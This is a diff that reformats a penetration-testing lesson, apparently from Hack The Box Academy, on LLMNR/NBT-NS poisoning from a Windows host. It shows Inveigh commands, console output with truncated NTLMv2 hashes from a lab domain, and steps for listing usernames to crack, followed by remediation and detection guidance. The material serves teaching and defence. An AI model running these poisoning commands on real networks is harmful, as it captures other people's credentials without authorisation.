@@ -1,16 +1,18 @@
-LLMNR & NBT-NS poisoning is possible from a Windows host as well. In the last section, we utilized Responder to capture hashes. This section will explore the tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) and attempt to capture another set of credentials.
+# LLMNR NBT-NS Poisoning - from Windows
 
----
+LLMNR & NBT-NS poisoning is possible from a Windows host as well. In the last section, we utilized Responder to capture hashes. This section will explore the tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) and attempt to capture another set of credentials.
 
-## Inveigh - Overview
+***
 
-If we end up with a Windows host as our attack box, our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) works similar to Responder, but is written in PowerShell and C#. Inveigh can listen to IPv4 and IPv6 and several other protocols, including `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, and Proxy Auth. The tool is available in the `C:\Tools` directory on the provided Windows attack host.
+### Inveigh - Overview
 
-We can get started with the PowerShell version as follows and then list all possible parameters. There is a [wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) that lists all parameters and usage instructions.
+If we end up with a Windows host as our attack box, our client provides us with a Windows box to test from, or we land on a Windows host as a local admin via another attack method and would like to look to further our access, the tool [Inveigh](https://github.com/Kevin-Robertson/Inveigh) works similar to Responder, but is written in PowerShell and C#. Inveigh can listen to IPv4 and IPv6 and several other protocols, including `LLMNR`, DNS, `mDNS`, NBNS, `DHCPv6`, ICMPv6, `HTTP`, HTTPS, `SMB`, LDAP, `WebDAV`, and Proxy Auth. The tool is available in the `C:\Tools` directory on the provided Windows attack host.
 
-## Using Inveigh
+We can get started with the PowerShell version as follows and then list all possible parameters. There is a [wiki](https://github.com/Kevin-Robertson/Inveigh/wiki/Parameters) that lists all parameters and usage instructions.
 
-  LLMNR/NBT-NS Poisoning - from Windows
+### Using Inveigh
+
+&#x20; LLMNR/NBT-NS Poisoning - from Windows
 
 ```powershell-session
 PS C:\htb> Import-Module .\Inveigh.ps1
@@ -42,9 +44,9 @@ LLMNRTTL                System.Management.Automation.ParameterMetadata
 <SNIP>
 ```
 
-Let's start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file. We will leave the rest of the defaults, which can be seen [here](https://github.com/Kevin-Robertson/Inveigh#parameter-help).
+Let's start Inveigh with LLMNR and NBNS spoofing, and output to the console and write to a file. We will leave the rest of the defaults, which can be seen [here](https://github.com/Kevin-Robertson/Inveigh#parameter-help).
 
-  LLMNR/NBT-NS Poisoning - from Windows
+&#x20; LLMNR/NBT-NS Poisoning - from Windows
 
 ```powershell-session
 PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
@@ -103,15 +105,15 @@ We can see that we immediately begin getting LLMNR and mDNS requests. The below 
 
 ![GIF showcasing the usage of the Inveigh PowerShell module in a PowerShell terminal.](https://academy.hackthebox.com/storage/modules/143/inveigh_pwsh.png)
 
----
+***
 
-## C# Inveigh (InveighZero)
+### C# Inveigh (InveighZero)
 
-The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version, which combines the original PoC C# code and a C# port of most of the code from the PowerShell version. Before we can use the C# version of the tool, we have to compile the executable. To save time, we have included a copy of both the PowerShell and compiled executable version of the tool in the `C:\Tools` folder on the target host in the lab, but it is worth walking through the exercise (and best practice) of compiling it yourself using Visual Studio.
+The PowerShell version of Inveigh is the original version and is no longer updated. The tool author maintains the C# version, which combines the original PoC C# code and a C# port of most of the code from the PowerShell version. Before we can use the C# version of the tool, we have to compile the executable. To save time, we have included a copy of both the PowerShell and compiled executable version of the tool in the `C:\Tools` folder on the target host in the lab, but it is worth walking through the exercise (and best practice) of compiling it yourself using Visual Studio.
 
 Let's go ahead and run the C# version with the defaults and start capturing hashes.
 
-  LLMNR/NBT-NS Poisoning - from Windows
+&#x20; LLMNR/NBT-NS Poisoning - from Windows
 
 ```powershell-session
 PS C:\htb> .\Inveigh.exe
@@ -156,11 +158,11 @@ PS C:\htb> .\Inveigh.exe
 [-] [20:03:32] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
 ```
 
-As we can see, the tool starts and shows which options are enabled by default and which are not. The options with a `[+]` are default and enabled by default and the ones with a `[ ]` before them are disabled. The running console output also shows us which options are disabled and, therefore, responses are not being sent (mDNS in the above example). We can also see the message `Press ESC to enter/exit interactive console`, which is very useful while running the tool. The console gives us access to captured credentials/hashes, allows us to stop Inveigh, and more.
+As we can see, the tool starts and shows which options are enabled by default and which are not. The options with a `[+]` are default and enabled by default and the ones with a `[ ]` before them are disabled. The running console output also shows us which options are disabled and, therefore, responses are not being sent (mDNS in the above example). We can also see the message `Press ESC to enter/exit interactive console`, which is very useful while running the tool. The console gives us access to captured credentials/hashes, allows us to stop Inveigh, and more.
 
-We can hit the `esc` key to enter the console while Inveigh is running.
+We can hit the `esc` key to enter the console while Inveigh is running.
 
-  LLMNR/NBT-NS Poisoning - from Windows
+&#x20; LLMNR/NBT-NS Poisoning - from Windows
 
 ```powershell-session
 
@@ -179,9 +181,9 @@ We can hit the `esc` key to enter the console while Inveigh is running.
 C(0:0) NTLMv1(0:0) NTLMv2(3:9)> HELP
 ```
 
-After typing `HELP` and hitting enter, we are presented with several options:
+After typing `HELP` and hitting enter, we are presented with several options:
 
-  LLMNR/NBT-NS Poisoning - from Windows
+&#x20; LLMNR/NBT-NS Poisoning - from Windows
 
 ```powershell-session
 
@@ -214,9 +216,9 @@ RESUME                          | resume real time console output
 STOP                            | stop Inveigh
 ```
 
-We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.
+We can quickly view unique captured hashes by typing `GET NTLMV2UNIQUE`.
 
-  LLMNR/NBT-NS Poisoning - from Windows
+&#x20; LLMNR/NBT-NS Poisoning - from Windows
 
 ```powershell-session
 
@@ -230,9 +232,9 @@ forend::INLANEFREIGHT:32FD89BD78804B04:DFEB0C724F3ECE90E42BAF061B78BFE2:01010000
 <SNIP>
 ```
 
-We can type in `GET NTLMV2USERNAMES` and see which usernames we have collected. This is helpful if we want a listing of users to perform additional enumeration against and see which are worth attempting to crack offline using Hashcat.
+We can type in `GET NTLMV2USERNAMES` and see which usernames we have collected. This is helpful if we want a listing of users to perform additional enumeration against and see which are worth attempting to crack offline using Hashcat.
 
-  LLMNR/NBT-NS Poisoning - from Windows
+&#x20; LLMNR/NBT-NS Poisoning - from Windows
 
 ```powershell-session
 
@@ -251,11 +253,11 @@ Let's start Inveigh and then interact with the output a bit to put it all togeth
 
 ![GIF showcasing the usage of the Inveigh executable file.](https://academy.hackthebox.com/storage/modules/143/inveigh_csharp.png)
 
----
+***
 
-## Remediation
+### Remediation
 
-Mitre ATT&CK lists this technique as [ID: T1557.001](https://attack.mitre.org/techniques/T1557/001), `Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay`.
+Mitre ATT\&CK lists this technique as [ID: T1557.001](https://attack.mitre.org/techniques/T1557/001), `Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay`.
 
 There are a few ways to mitigate this attack. To ensure that these spoofing attacks are not possible, we can disable LLMNR and NBT-NS. As a word of caution, it is always worth slowly testing out a significant change like this to your environment carefully before rolling it out fully. As penetration testers, we can recommend these remediation steps, but should clearly communicate to our clients that they should test these changes heavily to ensure that disabling both protocols does not break anything in the network.
 
@@ -263,13 +265,13 @@ We can disable LLMNR in Group Policy by going to Computer Configuration --> Admi
 
 ![Group Policy Management Editor showing DNS Client settings, 'Turn off multicast name resolution' not configured.](https://academy.hackthebox.com/storage/modules/143/llmnr_disable.png)
 
-NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening `Network and Sharing Center` under `Control Panel`, clicking on `Change adapter settings`, right-clicking on the adapter to view its properties, selecting `Internet Protocol Version 4 (TCP/IPv4)`, and clicking the `Properties` button, then clicking on `Advanced` and selecting the `WINS` tab and finally selecting `Disable NetBIOS over TCP/IP`.
+NBT-NS cannot be disabled via Group Policy but must be disabled locally on each host. We can do this by opening `Network and Sharing Center` under `Control Panel`, clicking on `Change adapter settings`, right-clicking on the adapter to view its properties, selecting `Internet Protocol Version 4 (TCP/IPv4)`, and clicking the `Properties` button, then clicking on `Advanced` and selecting the `WINS` tab and finally selecting `Disable NetBIOS over TCP/IP`.
 
 ![Advanced TCP/IP Settings window showing WINS addresses, LMHOSTS lookup enabled, and NetBIOS settings options.](https://academy.hackthebox.com/storage/modules/143/disable_nbtns.png)
 
 While it is not possible to disable NBT-NS directly via GPO, we can create a PowerShell script under Computer Configuration --> Windows Settings --> Script (Startup/Shutdown) --> Startup with something like the following:
 
-Code: powershell
+Code: powershell
 
 ```powershell
 
@@ -277,11 +279,11 @@ $regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
 Get-ChildItem $regkey |foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
 ```
 
-In the Local Group Policy Editor, we will need to double click on `Startup`, choose the `PowerShell Scripts` tab, and select "For this GPO, run scripts in the following order" to `Run Windows PowerShell scripts first`, and then click on `Add` and choose the script. For these changes to occur, we would have to either reboot the target system or restart the network adapter.
+In the Local Group Policy Editor, we will need to double click on `Startup`, choose the `PowerShell Scripts` tab, and select "For this GPO, run scripts in the following order" to `Run Windows PowerShell scripts first`, and then click on `Add` and choose the script. For these changes to occur, we would have to either reboot the target system or restart the network adapter.
 
-![Local Group Policy Editor showing startup scripts with a PowerShell script path 'C:\Users\ab_adm...' configured.](https://academy.hackthebox.com/storage/modules/143/nbtns_gpo.png)
+![Local Group Policy Editor showing startup scripts with a PowerShell script path 'C:\Users\ab\_adm...' configured.](https://academy.hackthebox.com/storage/modules/143/nbtns_gpo.png)
 
-To push this out to all hosts in a domain, we could create a GPO using `Group Policy Management` on the Domain Controller and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as:
+To push this out to all hosts in a domain, we could create a GPO using `Group Policy Management` on the Domain Controller and host the script on the SYSVOL share in the scripts folder and then call it via its UNC path such as:
 
 `\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts`
 
@@ -291,10 +293,10 @@ Once the GPO is applied to specific OUs and those hosts are restarted, the scrip
 
 Other mitigations include filtering network traffic to block LLMNR/NetBIOS traffic and enabling SMB Signing to prevent NTLM relay attacks. Network intrusion detection and prevention systems can also be used to mitigate this activity, while network segmentation can be used to isolate hosts that require LLMNR or NetBIOS enabled to operate correctly.
 
----
+***
 
-## Detection
+### Detection
 
-It is not always possible to disable LLMNR and NetBIOS, and therefore we need ways to detect this type of attack behavior. One way is to use the attack against the attackers by injecting LLMNR and NBT-NS requests for non-existent hosts across different subnets and alerting if any of the responses receive answers which would be indicative of an attacker spoofing name resolution responses. This [blog post](https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/) explains this method more in-depth.
+It is not always possible to disable LLMNR and NetBIOS, and therefore we need ways to detect this type of attack behavior. One way is to use the attack against the attackers by injecting LLMNR and NBT-NS requests for non-existent hosts across different subnets and alerting if any of the responses receive answers which would be indicative of an attacker spoofing name resolution responses. This [blog post](https://www.praetorian.com/blog/a-simple-and-effective-way-to-detect-broadcast-name-resolution-poisoning-bnrp/) explains this method more in-depth.
 
-Furthermore, hosts can be monitored for traffic on ports UDP 5355 and 137, and event IDs [4697](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4697) and [7045](https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html) can be monitored for. Finally, we can monitor the registry key `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` for changes to the `EnableMulticast` DWORD value. A value of `0` would mean that LLMNR is disabled.
+Furthermore, hosts can be monitored for traffic on ports UDP 5355 and 137, and event IDs [4697](https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4697) and [7045](https://www.manageengine.com/products/active-directory-audit/kb/system-events/event-id-7045.html) can be monitored for. Finally, we can monitor the registry key `HKLM\Software\Policies\Microsoft\Windows NT\DNSClient` for changes to the `EnableMulticast` DWORD value. A value of `0` would mean that LLMNR is disabled.
